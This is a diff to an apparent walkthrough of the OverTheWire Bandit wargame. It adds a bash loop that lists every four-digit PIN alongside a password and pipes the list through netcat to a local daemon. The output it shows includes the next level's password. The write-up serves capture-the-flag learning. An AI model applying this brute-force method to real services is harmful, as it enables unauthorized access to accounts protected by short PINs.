@@ -809,13 +809,28 @@ bandit24@bandit:/tmp/bandit24$
 
 Now we need to create the file with all the combination to brute force over the daemon.
 
-for x in $(echo {0000..9999}); do printf "UoMYTrfrBFHyQXmg6gzctqAwO^C1IohZ $x\n" >> b0; done
+`for x in $(echo {0000..9999}); do printf "UoMYTrfrBFHyQXmg6gzctqAwO^C1IohZ $x\n" >> b0; done`
+
+Feed `netcat` with that file to start the sequence.
 
 ```
-for x in $(echo {0000..9999}); do printf "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $x\n" >> b0; done
+bandit24@bandit:/tmp/bandit24$ nc localhost 30002 < b0
+...
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+bandit24@bandit:/tmp/bandit24$
 ```
 
 ## Level 25 → Level 26
+
+
+```
+```
+
 ## Level 26 → Level 27
 ## Level 27 → Level 28
 ## Level 28 → Level 29
